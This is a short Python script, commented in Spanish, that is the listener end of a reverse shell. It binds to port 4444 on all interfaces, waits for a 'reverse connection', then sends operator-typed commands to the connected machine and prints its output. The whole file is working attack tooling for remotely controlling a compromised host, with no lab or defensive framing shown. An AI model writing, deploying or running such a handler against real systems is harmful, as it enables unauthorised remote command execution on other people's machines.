import socket

# Crear servidor de escucha
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 4444))  # Escucha en todas las interfaces
server.listen(1)
print("[+] Esperando conexión reversa...")

# Aceptar conexión
conn, addr = server.accept()
print(f"[+] Conexión recibida de {addr}")

while True:
    # Enviar comandos
    cmd = input(">> ")
    if cmd.lower() == "exit":
        break
    conn.send(cmd.encode())
    
    # Recibir respuesta
    response = conn.recv(4096).decode()
    print(response)

conn.close()
